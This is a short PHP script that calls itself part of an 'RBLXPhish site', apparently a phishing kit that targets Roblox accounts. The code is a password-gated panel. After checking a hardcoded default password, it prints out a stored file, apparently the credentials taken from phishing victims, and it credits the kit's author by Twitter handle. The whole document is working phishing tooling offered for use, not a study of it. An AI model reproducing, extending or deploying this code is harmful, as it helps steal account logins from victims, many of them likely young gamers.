<?php
$Password=$_POST['pwd'];
$YourPWD="changeme";

if($Password == $YourPWD){
	echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><a>- Thank you for using </a><a href="http://twitter.com/DominusTrex">9/11 / DominusTrex</a><a>'."'".'s RBLXPhish site! - </a><br><br>';
    $myFile = "1569893sGt2691";
    $lines = file($myFile);
    $lineNumber = 1;
   foreach($lines as $line_num => $line)
{
echo $line."<br>";
}
}else{
echo "Wrong password.";
}
?>